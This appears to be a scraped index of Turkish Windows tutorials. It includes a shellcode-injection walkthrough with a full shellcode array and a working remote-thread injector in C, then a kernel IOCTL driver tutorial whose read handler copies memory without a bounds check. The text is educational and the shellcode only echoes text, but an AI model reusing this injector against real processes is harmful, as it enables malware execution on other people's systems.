\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\" \"\\x49\\x6e\\x6a\\x65\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\" \"\\x20\\x62\\x65\\x6b\\x6f\\x6f\\x22\\x00\"; int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } if (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Detaylıca göz atalım:\nchar Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\" \"\\x49\\x6e\\x6a\\x65\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\" \"\\x20\\x62\\x65\\x6b\\x6f\\x6f\\x22\\x00\"; Bu shellcode, cmd.exe’yi açarak “Shellcode Injection with bekoo” yazısını ekrana yazdıran bir shellcode’dur. Bu shellcode’u hedef process’e enjekte edeceğiz.\nint main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; ... Programın çalıştırılmasından ardından ilk olarak main içerisinde argc değişkenini kontrol ediyoruz. Bu değişken, programın çalıştırılmasında verilen argüman sayısını tutar. Eğer argc değişkeni 2’den küçükse, programın doğru kullanımını ekrana bastırıp -1 ile programı return ediyoruz.\nDaha sonra malware’in çalıştırılması için gereken değişkenleri oluşturuyoruz:\nPID: Bu değişken, hedef process’in PID’sini tutar. HandleProcess: Bu değişken, hedef process’in handle’ini tutmak için kullanılır. HandleThread: Bu değişken, hedef process’te oluşturulacak thread’ın handle’ını tutmak için kullanılır. RemoteBuffer: Bu değişken, hedef process’te oluşturulacak shellcode’un adresini tutmak için kullanılır. HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } Bu kısımda, hedef process’in handle’ını alıyoruz. Yani hedef programa erişim sağlıyoruz gibi düşünebilirsiniz. Eğer hedef process’in handle’ını alamazsak, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nRemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } Daha sonra hedef process’in bellek alanında, shellcode’u tutacak bir alan rezerve ediyoruz. Eğer bu işlem başarısız olursa, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nif (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } Bu kısımda, hedef process’in bellek alanına shellcode’u yazıyoruz. Eğer bu işlem başarısız olursa, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Bu kısımda ise hedef process’te yeni bir thread oluşturuyoruz. Bu thread, hedef process’in bellek alanında bulunan shellcode’u çalıştıracaktır. Eğer bu işlem başarısız olursa, hata mesajı ekrana bastırıp -1 ile programı return ediyoruz.\nSon olarak ise WaitForSingleObject aracılığıyla oluşturduğumuz thread’ın bitmesini bekliyoruz ve ardından hedef process’in handle’larını serbest bırakıyoruz.","nedir-bu-processler#Nedir bu Process\u0026rsquo;ler":"","shellcode-execution-nedir#Shellcode Execution Nedir?":"","threadler-nedir#Thread\u0026rsquo;ler Nedir?":""},"title":"Shellcode Injection"},"/docs/winkernel-dev/":{"data":{"":"Windows Kernel Development ile ilgili konuları incelemek için aşağıdaki bölümlere göz atabilirsiniz:\nSystem Service Descriptor Table\rVirtual Memory\rDevice Input and Output Control\rI/O request packets"},"title":"Windows Kernel Dev."},"/docs/winkernel-dev/wkd-ioctl/":{"data":{"":"","code#Code":"","ioctl-nedir#IOCTL Nedir?":"","references#References":"Merhabalar, bu yazıda Windows Kernel Development’tan IOCTL mekanizmasını inceleyeceğiz.\nIOCTL Nedir? I/O Control Codes (G/Ç Kontrol Kodları) olarak adlandırılan IOCTL, User-mode uygulamarın ve sürücülerin arasındaki iletişim için veya stack içerisindeki sürücüler arasındaki iletişim için kullanılan bir mekanizmadır. I/O Kontrol kodları, önceki konumda bahsettiğim IRP’ler aracılığıyla gönderilir. Eğer IRP’ler hakkında bir bilginiz yoksa buraya tıklayarak IRP’ler hakkında bilgi alabilirsiniz.\nWindows’ta User-mode programları, DeviceIoControl API kullanarak sürücülere IOCTL kodlarını gönderir. Bu API, alınan IOCTL kodunu IRP_MJ_DEVICE_CONTROL aracılığıyla sürücüye gönderir. Aynı zamanda IOCTL mekanizmanın tek özelliği de bu olmadığını tekrar vurgulayalım. İleri seviye sürücülerin IRP_MJ_DEVICE_CONTROL veya IRP_MJ_INTERNAL_DEVICE_CONTROL aracılığıya istek oluşturarak, alt sürücülere IOCTL isteği gönderme imkanı sunar.\nIOCTL kodları, genellikle sürücü geliştiricileri tarafından tanımlanan özel kodlar olabilir, ancak aynı zamanda Windows işletim sistemi tarafından belirli standart işlemler için önceden tanımlanmış kodlar da olabilir. Bu standart IOCTL kodları, Windows’un donanım ve yazılım bileşenleri arasındaki iletişimi standartlaştırmak ve kolaylaştırmak amacıyla sağlanır. Örneğin, bazı IOCTL kodları, donanım cihazlarının özelliklerini sorgulama veya belirli işlemleri başlatma gibi genel görevler için kullanılır. Geliştiriciler, özel ihtiyaçlarına göre bu kodları özelleştirebilir veya yeni kodlar tanımlayabilirler, bu da esneklik ve genişletilebilirlik sağlar.\nCode Önceki konumuzda olduğu gibi user-mode program ve kernel-mode sürücümüzü oluşturacağız.\nSenaryoda IOCTL_MEM_ALLOCATE kodu aracılığıyla user-mode uygulaması sürücüye kernel-space alanında bellek ayırması için kod ve bir veri gönderecek. Öte yandan oluşturacağımız IOCTL_MEM_READ kodu ile sürücümüz, bellek adresten veriyi alıp user-mode programa gönderecek.\nGithub linki için buraya tıklayabilirsiniz.\nKernel Mode - Driver Öncekikle sürücümüzü kodlayarak başlayalım:\n#include \"main.h\" #define TAG 'beko' #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) PVOID GlobalMemoryAddr = NULL; NTSTATUS IoCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); NTSTATUS status = STATUS_SUCCESS; switch (Stack-\u003eMajorFunction) { case IRP_MJ_CREATE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; case IRP_MJ_CLOSE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; default: status = STATUS_INVALID_DEVICE_REQUEST; break; } Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; switch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } DbgPrintEx(0, 0, \"Data from UserLand program: %.*s\", Length, UserBuffer); GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create I/O Device!\\n\"); return Status; } Status = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } DriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(DriverObject-\u003eDeviceObject); return STATUS_SUCCESS; } Önceki IRP konusuna aşina olduysanız zaten hemen hemen benzer kod olduğunu anlamışsınızdır. Şimdi detaylıca göz atalım:\n#define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) Her şeyden önce konumuzla ilgisi olan tanımladığımız IOCTL kodlarına bir bakalım.\nCTL_CODE makrosu, IOCTL kodlarını tanımlamak için kullanılır ve bu makro, çeşitli parametrelerle birlikte bir IOCTL kodu oluşturur. Parametreler şunlardır:\nDeviceType: Cihaz türünü belirtir. Bu, FILE_DEVICE_UNKNOWN, FILE_DEVICE_DISK, FILE_DEVICE_KEYBOARD gibi veya diğerlerinden biri olabilir. Burada kullandığımız FILE_DEVICE_UNKNOWN, belirli bir cihaz türü belirtmediğimiz ve genel bir cihaz tipi kullandığımız anlamına gelir.\nFunctionCode: IOCTL işleminin benzersiz bir kodunu belirler. Bu, işlemi tanımlayan bir sayıdır ve genellikle uygulama veya sürücü tarafından belirlenen bir değerdir. Örneğin, 0x800 ve 0x801 gibi değerler olabilir.\nMethod: IOCTL işleminin veriyi nasıl ileteceğini tanımlar. Bu parametreler METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, ve METHOD_NEITHER gibi seçenekler bulunur. Kodumuzdaki METHOD_BUFFERED seçeneği, verinin bir bellek tamponu aracılığıyla taşınmasını ifade eder.\nAccess: IOCTL işleminin hangi erişim izinlerine sahip olduğunu belirtir. Bu parametre için FILE_ANY_ACCESS, FILE_SHARE_READ, FILE_SHARE_WRITE gibi seçenekler kullanılabilir. Kodumuzdaki FILE_ANY_ACCESS, işlemin herhangi bir erişim iznine sahip olduğunu ifade eder.\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; İlk olarak DriverEntry DeviceName ve SymName adında iki adet UNICODE_STRING tanımladık. Bu iki değişken, sürücümüzün adını ve sembolik adını tutmaktadır. Bu değişkenlerle, sürücümüzün adını ve sembolik adını belirlemek için kullanacağız.\nStatus = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create I/O Device!\\n\"); return Status; } Daha sonra IoCreateDevice fonksiyonu ile bir aygıt nesnesi oluşturuyoruz. Bu fonksiyon, sürücümüz için bir aygıt nesnesi oluşturur ve bu nesneyi DeviceObject değişkenine atar.\nStatus = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } IoCreateSymbolicLink fonksiyonu ile sembolik bir bağlantı oluşturuyoruz. Bu sayede, user mode programımızda sürücünün adını ve sembolik adını kullanarak sürücümüze erişiyor olacağız.\nDriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; Son olarak, sürücüde IRP istekleri için IRP_MJ_CREATE, IRP_MJ_CLOSE ve IRP_MJ_DEVICE_CONTROL fonksiyonlarını belirliyoruz. Bu fonksiyonlar, gelecek IRP isteklerini işleyecek olan fonksiyonlardır. Ayrıca, sürücümüzün yüklenmesi sırasında çağrılacak olan UnloadDriver fonksiyonunu belirliyoruz.\nŞimdi ise IOCTL kodlarını işleyecek fonksiyona göz atalım:\nPIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; İlk olarak IoGetCurrentIrpStackLocation fonksiyonu ile mevcut IRP yığın konumunu alıyoruz. Daha sonra, user-mode programımızın gönderdiği veriyi almak için Irp-\u003eAssociatedIrp.SystemBuffer kullanıyoruz. Ayrıca, IRP’nin giriş ve çıkış veri boyutlarını almak için Stack-\u003eParameters.DeviceIoControl.OutputBufferLength ve Stack-\u003eParameters.DeviceIoControl.InputBufferLength kullanarak alıyoruz. Son olarak, bellek tahsis etmek için kullanacağımız TAG değerini tanımlıyoruz.\nswitch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); İlk olarak Stack-\u003eParameters.DeviceIoControl.IoControlCode ile user-mode’ın gönderdiği IOCTL kodunu alıyoruz. Hangi kod gönderildiyse ona göre işlemleri yapacağız.\nEğer IOCTL_MEM_ALLOCATE kodu gelmişse, öncelikle UserBuffer’ın ve Length’in kontrolünü yapıyoruz. Eğer UserBuffer NULL ise veya Length 0 ise, hatalı parametre hatası döndürüyoruz. Daha sonra, ExAllocatePool2 fonksiyonu ile kernel-space tarafında bellek tahsis ediyoruz. Eğer bellek tahsis edilemezse, yetersiz kaynak hatası döndürüyoruz. Son olarak, RtlCopyMemory fonksiyonu ile user-mode’dan gelen veriyi kernel-mode belleğe kopyalıyoruz.\nEğer IOCTL_MEM_READ kodu gelmişse, kernel-space alanından ayrılan bellek adresinden veriyi alıp UserBuffer’a kopyalıyoruz ve Output olarak veriyi user-mode programa gönderiyoruz.\ndefault kısmında ise geçersiz bir IOCTL kodu gönderildiğinde hata döndürerek isteği bitiriyoruz.\nUser Mode - Program Şimdi ise user-mode programımıza göz atalım:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) int main(int argc, char* argv[]) { HANDLE HandleDevice = NULL; CHAR InBuffer[] = \"Piyanis bana biraaak\"; CHAR OutBuffer[sizeof(InBuffer)] = { 0 }; DWORD InputBytesReturned = 0; DWORD OutputBytesReturned = 0; BOOL Result = 0; HandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL); if (!Result) { printf(\"Failed to Allocate Memory! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); return 0; } User-mode kodumuzda bu. Şimdi detaylıca göz atalım:\n#define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) User-mode programımızda ilk olarak iletişim kuracağımız sürücünün ismini ve yukarıda bahsettiğim aynı CTL kodlarını tanımlıyoruz.\nHandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Bu kısımda ise CreateFile aracılığıyla sürücümüzle iletişime geçiyoruz.\nResult = DeviceIoControl(HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL); if (!Result) { printf(\"Failed to Allocate Memory! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Bu kısımda ise DeviceIoControl aracılığıyla sürücümüze IOCTL_MEM_ALLOCATE kodunu gönderiyoruz. Eğer IOCTL kodu başarılı bir şekilde gönderilmezse hata döndürüyoruz.\nParametrelere dikkat edin. Bizim şuan bu kod parçasındaki amacımız kernel-space alanından bir bellek ayrımı yapmak ve gönderdiğimiz veriyi yazdırması. Veri göndermek için Input olarak verimizi ve uzunluğunu gönderiyoruz. Birazdan veri alırken bunu output için yaptığımızı göreceksiniz.\nResult = DeviceIoControl(HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); Artık verimiz kernel alanına yazıldı ve tekrar IOCTL_MEM_READ kodunu göndererek kernel-space alanından veriyi alıyoruz. Bu sefer ise sürücümüz bize veri göndereceği için göndereceği verileri OutBuffer değişkenie aktarıyoruz. Son olarak ise alınan veriyi ekrana yazdırıyoruz.\nTekrardan parametrelere dikkat edin. Bu sefer Input parametreleri için NULL ve 0 gönderiyoruz. Çünkü sadece veri alacağız. Output olarak ise OutBuffer ve OutBuffer’ın uzunluğunu veriyoruz.\nSürücü ve Programın Çalıştırılması Öncelikle sürücümüzü sisteme yükleyip ardından çalıştıralım:\nArdından user-mode programını çalıştıralım:\nGöründüğü gibi programımızı çalıştırdığımızda Windbg’dan user-mode programın gönderdiği veriyi ekrana bastırdığını, ardından sürücünün user-mode programına gönderdiği veriyi ekrana bastırdığını görebiliriz.\nSonuç Bu konumuzda IOCTL hakkında bilgi verdim ve basit bir örnek üzerinden nasıl kullanıldığını gösterdim. Umarım bu mekanizmayi daha iyi anlamanıza yardımcı olmuştur.\nİyi çalışmalar dilerim 🚀🚀\nReferences Windows Docs - Introduction to I/O Control Codes Windows Docs - Device Input and Output Control ","sonuç#Sonuç":"","sürücü-ve-programın-çalıştırılması#Sürücü ve Programın Çalıştırılması":""},"title":"IOCTL"},"/docs/winkernel-dev/wkd-irp/":{"data":{"":"","code#Code":"","io-request-packet-irp-nedir#I/O Request Packet (IRP) Nedir?":"","references#References":"Merhabalar, Windows Kernel Development’ın ilk serisi olarak bu konuda sizlere I/O Request Packet (IRP) konusunu inceleyeceğiz.\nI/O Request Packet (IRP) Nedir? I/O Request Packet, kısaca IRP, Windows işletim sisteminde sürücüler ile işletim sistemi arasında bilgi alışverişini sağlayan bir yapıdır. Bunu bir “mesaj taşıyıcısı” gibi düşünebilirsiniz.\nGenellikle, sürücülere gönderilen talepler IRP olarak adlandırılan bu paketlerle gönderilir. Bir işletim sistemi bileşeni veya sürücü, IRP’yi bir sürücüye iletmek için IoCallDriver adlı bir fonksiyonu kullanır. Bu fonksiyon, bir aygıt 